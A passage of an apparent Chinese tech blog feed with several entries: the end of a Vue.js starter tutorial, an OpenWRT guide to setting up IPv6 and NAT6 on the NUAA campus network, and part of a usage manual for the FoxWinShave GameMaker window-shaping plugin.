<p>vue还提供了一个状态管理模式 <a href="https://vuex.vuejs.org/zh/">vuex</a>，可以很方便的管理所有组件的状态。对应文件 <code>src/store.js</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">store</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">Vuex</span> <span class="nx">from</span> <span class="s1">&#39;vuex&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">Vuex</span><span class="p">)</span>
<span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">mutations</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">},</span>
  <span class="nx">actions</span><span class="o">:</span> <span class="p">{</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div><p><del>由于我还没用过 <code>vuex</code> 所以自己看文档吧</del></p>
<p>对于简单的应用也可以不用 <code>vuex</code> ，一个简单的 <a href="https://cn.vuejs.org/v2/guide/state-management.html#%E7%AE%80%E5%8D%95%E7%8A%B6%E6%80%81%E7%AE%A1%E7%90%86%E8%B5%B7%E6%AD%A5%E4%BD%BF%E7%94%A8"><code>store</code> 模式</a> 就足够了</p>
<h1 id="0x4-开发指引">0x4 开发指引</h1>
<p>有了上面的基础，我们就可以开始写代码了，这里以添加一个 <code>Foo</code> 页面展示从远端获得的数据为例</p>
<h2 id="1-给页面添加一个-tab">1. 给页面添加一个 <code>Tab</code></h2>
<p><code>Tab</code> 属于与页面逻辑无关，但又处处要使用的元素，所以我们将其独立成为一个组件</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">src/components/Tab.vue

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;tab&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>home<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/about&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;item&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;router(&#39;/foo&#39;)&#34;</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>foo<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Tab&#39;</span><span class="p">,</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">router</span> <span class="p">(</span><span class="nx">url</span><span class="p">){</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span> <span class="na">scoped</span><span class="p">&gt;</span>
<span class="p">#</span><span class="nn">tab</span> <span class="p">{</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">space</span><span class="o">-</span><span class="n">around</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">bottom</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">position</span><span class="p">:</span> <span class="kc">fixed</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">65</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">left</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">%</span><span class="p">;</span>
  <span class="k">background-color</span><span class="p">:</span> <span class="kc">aquamarine</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">.</span><span class="nc">item</span> <span class="p">{</span>
  <span class="k">padding-top</span><span class="p">:</span> <span class="mi">5</span><span class="kt">px</span><span class="p">;</span>
  <span class="k">display</span><span class="p">:</span> <span class="kc">flex</span><span class="p">;</span>
  <span class="k">flex-direction</span><span class="p">:</span> <span class="kc">column</span><span class="p">;</span>
  <span class="k">justify-content</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">align-items</span><span class="p">:</span> <span class="kc">center</span><span class="p">;</span>
  <span class="k">height</span><span class="p">:</span> <span class="mi">50</span><span class="kt">px</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p>在这里我们创建了一个底部导航栏，有三个 <code>Tab</code> ，并且对应跳转到不同的页面</p>
<h2 id="2-创建-foovue-相关逻辑并与后端交互">2. 创建 <code>Foo.vue</code> 相关逻辑并与后端交互</h2>
<p>因为我们需要从远端API获取数据并进行展示，就涉及网络请求。在vue中，官方推荐使用 <a href="https://github.com/axios/axios">axios</a> 发起请求。<code>axios</code> 是一个基于 <code>promise</code> 的异步网络请求库，相关用法可参考文档或网上教程</p>
<p>安装 <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn add axios
</code></pre></div><p>接着在 <code>src/main.js</code> 中加入以下语句启用 <code>axios</code></p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">import</span> <span class="nx">Axios</span> <span class="nx">from</span> <span class="s1">&#39;axios&#39;</span>
<span class="c1">// 把axios添加到原型链
</span><span class="c1"></span><span class="nx">Vue</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">$axios</span> <span class="o">=</span> <span class="nx">Axios</span>
</code></pre></div><p>现在就可以在vue实例中用 <code>this.$router</code> 来访问路由了</p>
<hr>
<p>接着来创建 <code>Foo.vue</code></p>
<div class="highlight"><pre class="chroma"><code class="language-vue" data-lang="vue"><span class="nx">src</span><span class="o">/</span><span class="nx">views</span><span class="o">/</span><span class="nx">Foo</span><span class="p">.</span><span class="nx">vue</span>

<span class="p">&lt;</span><span class="nt">template</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;foo&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;{{</span> <span class="nx">result</span> <span class="p">}}&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">button</span> <span class="nt">@click</span><span class="s">=&#34;bar()&#34;</span><span class="p">&gt;</span><span class="na">bar</span><span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="kr">export</span> <span class="k">default</span> <span class="p">{</span>
  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Foo&#39;</span><span class="p">,</span>
  <span class="nx">data</span><span class="p">(){</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">result</span> <span class="o">:</span> <span class="s1">&#39;naive&#39;</span>
    <span class="p">}</span>
  <span class="p">},</span>
  <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
    <span class="nx">bar</span><span class="p">(){</span>
      <span class="cm">/* eslint-disable */</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="s1">&#39;loading...&#39;</span>
      <span class="k">this</span><span class="p">.</span><span class="nx">$axios</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;http://httpbin.org/post&#39;</span><span class="p">)</span>
        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="k">this</span><span class="p">.</span><span class="nx">result</span> <span class="o">=</span> <span class="nx">res</span><span class="p">})</span>
        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">res</span><span class="p">)})</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</code></pre></div><p><del>具体实现代码里面很清楚了</del> 这个文件的作用就是请求 <code>http://httpbin.org/get</code> 并把结果显示在界面上</p>
<p><strong>注意前后端分离的项目会有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">跨域(CORS)问题</a>，这个问题比较复杂，巨坑，网上也有较多解决的文章<del>咕咕咕</del></strong></p>
<h1 id="0x5-技巧及坑们">0x5 技巧及坑们</h1>
<p>这里介绍一些我写vue项目遇到的坑和使用的技巧</p>
<h2 id="data-methods-computed-props-的区别">data methods computed props 的区别</h2>
<p><del>TODO</del></p>
<p>vue中存储数据有几种方式——data、</p>
<h1 id="0x6-结语">0x6 结语</h1>
<p>到此，一个简单的vue项目就完成了，对于如何组织项目，前后端如何交互应该已经有了初步了解。本文也会持续更新，欢迎关注我的<a href="https://blog.creedowl.com/">blog</a></p>
<p>本文的实例请访问<a href="https://github.com/creedowl/vue_demo/">github</a></p>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/</id>
        <title><![CDATA[南航校园网OpenWRT配置IPv6 NAT6]]></title>
        <updated>2019-04-04T15:29:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"><![CDATA[<blockquote>
<p>当前IPv6越来越流行，不但解决了IPv4地址不够用的问题，还能给接入的设备提供公网访问的支持。但由于校园网的特殊性，虽然很早就有了IPv6支持，大部分学校在IPv6地址分配上却有剧毒，无法向下游设备分配独立的IPv6地址（正常家庭网络环境中路由器及下游设备都能自动分配独立的公网IPv6地址），以南航为例，OpenWRT上虽然获取到了2001开头，/64结尾的公网IPv6地址，但下游设备却无IPv6访问权限。本文介绍南航校园网环境下如何在OpenWRT下获取IPv6并配置NAT6使下游设备拥有IPv6访问权限。</p>
</blockquote>
<h2 id="0软硬件需求">0：软硬件需求</h2>
<p><strong>硬件</strong>：支持OpenWRT固件的路由器或软路由（推荐使用软路由，性能更好，支持启用更多服务，且不需要考虑太多兼容性问题，x86版本OpenWRT一把梭）</p>
<p><strong>软件</strong>：较新版本的OpenWRT或其衍生版本（lede，pandorabox等，但原版OpenWRT最佳）</p>
<p><strong>OpenWRT内核需高于3.7</strong>， linux kernel在3.7版本开始支持NAT6</p>
<p><del>内核版本不够高且无法升级可以尝试早年由北邮大佬开发的NAT66项目，但不推荐</del></p>
<p>所需软件包：</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ip6tables kmod-ipt-nat6 kmod-ip6tables kmod-ip6tables-extra luci-proto-ipv6 iputils-traceroute6
</code></pre></div><p>较新版本已经自带IPv6支持，老版本需要自己安装相关软件包，但兼容性较差，或者内核版本不足，建议找较新版本或者自行编译。</p>
<h2 id="1openwrt配置获取ipv6">1：OpenWRT配置获取IPv6</h2>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304901671.png/compress" alt="IPv6_setting_1"></p>
<h3 id="1-修改ipv6-ula前缀为fd开头默认为dd开头">1. 修改IPv6 ULA前缀为fd开头（默认为dd开头）</h3>
<h3 id="2-修改wan6口配置如下图所示">2. 修改wan6口配置（如下图所示）</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304939503.png/compress" alt="IPv6_setting_2"></p>
<h3 id="3-修改lan口dhcp服务器配置如下图所示">3. 修改lan口DHCP服务器配置（如下图所示）</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304973656.png/compress" alt="IPv6_setting_3"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304997028.png/compress" alt="IPv6_setting_4"></p>
<p>此时稍等片刻，在概况中应该就能看到获取到的IPv6地址及下游设备DHCPv6分配内网IPv6地址</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305013341.png/compress" alt="IPv6_setting_5"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305030637.png/compress" alt="IPv6_setting_6"></p>
<p>现在你的路由器已经可以使用IPv6了，但下游设备并不行，就需要配置NAT6。</p>
<h2 id="2配置nat6">2：配置NAT6</h2>
<p>虽然NAT6并不符合IPv6的设计哲学，但却能解决一些问题，如安全隔离，或者像我们这样通过单一地址转发给多个设备使用。</p>
<h3 id="1-修改防火墙">1. 修改防火墙</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305046715.png/compress" alt="IPv6_setting_7"></p>
<p>加入以下自定义规则</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">WAN6</span><span class="o">=</span>pppoe-wan
<span class="nv">LAN</span><span class="o">=</span>br-lan
ip6tables -t nat -A POSTROUTING -o <span class="nv">$WAN6</span> -j MASQUERADE
ip6tables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
ip6tables -A FORWARD -i <span class="nv">$LAN</span> -j ACCEPT
</code></pre></div><p><strong>注意这里WAN6和LAN要改为外网IPv6和内网网卡名字，在终端使用ifconfig查看</strong></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305068355.png/compress" alt="IPv6_setting_8"></p>
<h3 id="2-配置网关">2. 配置网关</h3>
<p>在终端执行 <code>ip -6 r</code> 查看默认网关（default开头），如果是类似</p>
<p><code>default from 2001:xxxx:xxxx:xxxx::/64 via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512 pref medium</code></p>
<p>这样蛋疼的网关，需要去掉<code>from 2001:xxxx:xxxx:xxxx::/64</code> 这段再添加默认网关，例如</p>
<p><code>ip -6 route add default via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512</code></p>
<p>可以建立一个<code>/etc/hotplug.d/iface/99-ipv6</code>实现自动配置</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTION</span><span class="s2">&#34;</span> <span class="o">=</span> ifup <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
<span class="nv">iface</span><span class="o">=</span>wan6
<span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> -o <span class="s2">&#34;</span><span class="nv">$INTERFACE</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
ip -6 route add <span class="sb">`</span>ip -6 route show default<span class="p">|</span>sed -e <span class="s1">&#39;s/from [^ ]* //&#39;</span><span class="sb">`</span>
logger -t IPv6 <span class="s2">&#34;Add IPv6 default route.&#34;</span>
</code></pre></div><p>最后别忘了修改权限</p>
<p><code>chmod +x /etc/hotplug.d/iface/99-ipv6</code></p>
<p>重启路由器就可以愉快的玩耍了。</p>
<p><del>本来还想折腾IPv6端口转发，但一直无法配置成功。后来突然发现南航校园网下没有对IPv4做严格隔离（除了80端口基本上都能直接访问），就直接做IPv4端口转发配合DDNS，连接校园WIFI（nuaa.portal，<strong>付费版本</strong>）就可以直接使用，速度还挺快。。。就真香了。。不过配置IPv6端口转发还是有意义，比如可以从非校园网访问，校园网访问IPv6无需认证（不要充钱了），相关教程有空再补上（咕咕咕）有需求可以参考<a href="https://shura.eu.org/2018/12/06/ipv6-NAT%E5%90%8E%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">ipv6 NAT后配置端口转发</a></del></p>
<h2 id="参考资料">参考资料</h2>
<blockquote>
<p><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">清华OpenWRT 路由器作为 IPv6 网关的配置</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/</id>
        <title><![CDATA[Linux内核gdb+qemu调试]]></title>
        <updated>2019-01-28T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"/>
        <content type="text/html" src="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"><![CDATA[Linux内核gdb+qemu调试]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/foxwinshave2.html</id>
        <title><![CDATA[FoxWinShave 2 中文使用手册]]></title>
        <updated>2019-01-12T08:45:27+08:00</updated>
        <link href="https://www.noisyfox.io/foxwinshave2.html"/>
        <content type="text/html" src="https://www.noisyfox.io/foxwinshave2.html"><![CDATA[<p>FoxWinShave 2 现已上架 GameMaker: Marketplace，支持 GM8, GMS 1.4 和 GMS 2。<a href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank" rel="noreferrer noopener" aria-label="（在新窗口打开）">点此从Marketplace下载最新版本</a>。</p>



<hr class="wp-block-separator"/>



<h2>0. 前置条件</h2>



<ul><li>仅支持 Windows 平台。</li><li>支持 Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10。</li><li>支持 GameMaker 7, GameMaker 8, GameMaker 8.1, GameMaker Studio 1.4.x, GameMaker Studio 2 Desktop。</li></ul>



<hr class="wp-block-separator"/>



<h2>1. 安装插件</h2>



<h3>1.0 GM 7, 8, 8.1</h3>



<p>菜单栏 File-&gt; Import Resources&#8230; 选择 FoxWinShave-GM8.gmres 导入插件及 Demo。</p>



<ul><li>在弹出的 Importing Resources 对话框中，请务必勾选 Scripts 和 Include Files 以导入插件运行所必须的文件和脚本。</li><li>如需同时导入 Demo 代码及素材，请将 Sprites，Objects 和 Rooms 一并勾选上。</li></ul>



<h3>1.1 GMS 1.4.x 及 GMS 2 Desktop</h3>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="189" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png" alt="" class="wp-image-569" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-768x483.png 768w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1024x644.png 1024w, https://www.noisyfox.io/wp-content/uploads/2019/01/image.png 1588w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>Import resources: FoxWinShave 对话框</figcaption></figure></div>



<ol><li>在 GameMaker: Marketplace 上购买本插件。<a rel="noreferrer noopener" aria-label="（在新窗口打开）" href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank">（点此购买）</a></li><li>在 GMS 中菜单栏选择 Marketplace -&gt; MyLibrary，找到 FoxWinShave，点击 Download。</li><li>下载完成后，点击 Import。</li><li>在弹出的 Import resources: FoxWinShave 对话框中，选中 Scripts 和 Included Files，然后点击中间的 Add 按钮以导入插件运行所必须的文件和脚本。</li><li>如需同时导入 Demo 代码及素材，那就直接点击中间的 Add All 按钮。</li><li>点击左下角 Import 按钮完成插件的导入。</li></ol>



<hr class="wp-block-separator"/>



<h2>2. 插件入门 101</h2>



<h3>2.0 基础准备</h3>



<p>请务必在游戏设置中将窗口设置为无边框（borderless window）:</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="240" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png" alt="" class="wp-image-592" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png 512w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GM 8 设置无边框</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="300" height="237" src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png" alt="" class="wp-image-591" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png 695w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GMS 2 设置无边框</figcaption></figure></div>



<p>稍后将会解释需要设置为无边框的原因。</p>



<h3>2.1 插件初始化</h3>



<p>使用本插件的任何脚本前需要先进行插件的初始化。建议在首个 Room 的 Creation Code 内或者某个控制用的 Object 的 Game Start 事件里执行：</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
NF_WS_Init();
</pre></div>


<p>插件初始化后请勿再次调用该函数。</p>



<h3>2.2 插件释放</h3>



<p>当不再需要更改窗口形状后，可以执行以下函数将插件卸载以释放资源：</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; highlight: [2]; title: ; notranslate">
NF_WS_ResetWindow(); // 重置窗口形状为默认，非必要
NF_WS_Free(); // 释放插件
</pre></div>


<p>在释放插件后如果需要再次使用本插件，需要重新进行插件的初始化。</p>



<h3>2.3 基础原理解释</h3>



<h4>2.3.0 窗口坐标系</h4>



<p>将游戏窗口想象成一个画布，按照窗口的边框开始算左上角坐标为 (0, 0)，右下角边框最外处坐标为 (viewport_width + 左边框宽 + 右边框宽, viewport_height + 上边框高 + 下边框高)，如下图所示：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="574" height="447" src="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" alt="" class="wp-image-635" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png 574w, https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1-300x234.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a><figcaption> <br>窗口坐标系统 </figcaption></figure></div>



<p>然而问题在于窗口的边框宽度是由 Windows 系统定义的，不同 Windows 版本或者不同的主题都有可能带有不同尺寸的边框，给在定义窗口的形状时计算坐标带来了麻烦。因此如上文所述，请<strong>务必</strong>在游戏全局设置中关闭窗口边框的显示，这样窗口的坐标系统就和游戏 View Port 的坐标系统的原点能够统一，便于将窗口形状与游戏绘制内容对齐。</p>



<p>下文在描述坐标时将默认使用无边框窗口。</p>



<h4>2.3.1 游戏绘制与 View Port</h4>



<p>GM 支持在一个窗口中同时显示多个 View Port。View Port 的作用是将 Room 的一部分内容按一定比例、缩放和位移映射在窗口中显示出来。用户实际看到的内容是经过 View Port 变换后的结果，并不（一定）是游戏中调用绘制代码时使用的坐标。</p>



<p>由于我们只关心用户实际看到了什么，因此下文中提到的<strong>“游戏绘制内容”</strong>的尺寸、坐标，皆为经过 View Port 变换后映射到窗口坐标系中的尺寸和坐标。</p>



<p>更多关于 View Port 的内容，请参考 GM 官方文档，下文将不再赘述。</p>



<h4>2.3.2 窗口形状遮罩</h4>



<p>本插件采用遮罩形式设置窗口形状，支持根据 Sprite 和 Surface（仅限 GMS）设置窗口遮罩。以下核心函数</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // 仅限 GMS
</pre></div>


<p>与 draw_sprite_* 系列绘制函数有着十分类似的形式，除了不支持 rot 和  <br>colour参数，同时 alpha 参数有不同的意义。可以理解为将给定的 Sprite / Surface 用提供的参数放置于窗口坐标系内作为遮罩（不经过 View Port 等任何变换），同时将窗口没有被遮罩覆盖的区域给“消去”变为透明：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" alt="" class="wp-image-654" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/mask-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>“遮罩层”内容</figcaption></figure></div>



<p>如图所示，红色部分的窗口会被保留下来，其余部分将会被消去。需要注意的是上图所谓的“遮罩层”是一个与窗口同样大小的位于窗口之上的想象出的一层，并不是实际存在的可见图层，其内容仅为了作为遮罩所用，并不会显示出来。</p>



<p>遮罩层使用的图像为彩色图像带 Alpha 通道。在实际运行时色彩通道会被完全忽略，最终窗口形状仅受遮罩层的 Alpha 通道影响。默认情况下每个 Alpha 通道值为 0 的像素（即纯透明像素）被认为是窗口需要被消去的部分。这个值可以通过上文所述的几个函数中的 alpha 参数（范围 [0, 1.0]）来改变。任何 Alpha 通道值 &lt;= 该参数的像素将被认为是需要消去的。注意，这意味着如果你传入的 alpha 参数为 1，则<strong>任何</strong>像素都会被认定为透明像素。</p>



<p>另外，如果使用 Surface 来传入遮罩内容，请注意 Surface 的背景需要用透明色填充：</p>


<div class="wp-block-syntaxhighlighter-code "><pre class="brush: cpp; highlight: [2]; title: ; notranslate">
surface_set_target(mask_surface);
draw_clear_alpha(c_white, 0); // Alpha = 0, 使用的颜色无所谓.
</pre></div>


<h4>2.3.3 遮罩对齐</h4>



<p>使用本插件的目的通常是想将游戏窗口的形状，裁剪成游戏绘制的有意义的内容的形状：</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose.png" target="_blank" rel="noreferrer noopener"><img loading="lazy" width="640" height="480" src="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png" alt="" class="wp-image-661" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/purpose-1-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>游戏实际绘制内容</figcaption></figure></div>



<p>上图中，女牛仔的部分是有意义的、需要保留的部分，而黑色背景需要被裁剪掉，也就意味着我们在遮罩层“绘制”的遮罩需要与女牛仔的位置、形状相同。</p>



<p>这乍一听似乎很容易，只要使用相同的 x，y 参数将同样的女牛仔 Sprite 绘制到 Application Surface 和遮罩层即可。但是正如上文所说，用户实际看到的内容是经过 View Port 变换过的，因此其实际显示的坐标和尺寸可能与绘制时传入的参数不同；然而遮罩层是不受 View Port 影响的，因此开发者需要自行计算遮罩层图像的位置和尺寸，用以对齐经过 View Port 变换后的游戏内容。建议不要用过于复杂的 View Port 设置。</p>



<h4>2.3.4 窗口形状更新时间与绘制事件顺序</h4>



